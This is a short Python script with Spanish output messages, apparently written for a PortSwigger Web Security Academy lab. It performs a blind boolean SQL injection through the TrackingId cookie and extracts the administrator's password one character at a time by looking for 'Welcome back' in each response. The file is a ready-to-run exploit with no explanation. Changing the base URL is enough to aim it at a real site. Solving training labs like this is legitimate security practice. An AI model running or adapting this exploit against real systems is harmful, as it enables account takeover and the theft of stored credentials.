import requests
import string
import time

base = "https://[TU-LAB-ID].web-security-academy.net/"
session = requests.Session()
r = session.get(base, timeout=15)
tracking = session.cookies.get("TrackingId")
chars = string.ascii_lowercase + string.digits
password = ""

for pos in range(1, 21):
    for c in chars:
        payload = f"{tracking}' AND (SELECT SUBSTRING(password,{pos},1) FROM users WHERE username='administrator')='{c}'--"
        try:
            r = session.get(base, cookies={"TrackingId": payload}, timeout=15)
            if "Welcome back" in r.text:
                password += c
                print(f"Letra {pos}: {c}")
                break
        except:
            time.sleep(2)
print(f"Contraseña: {password}")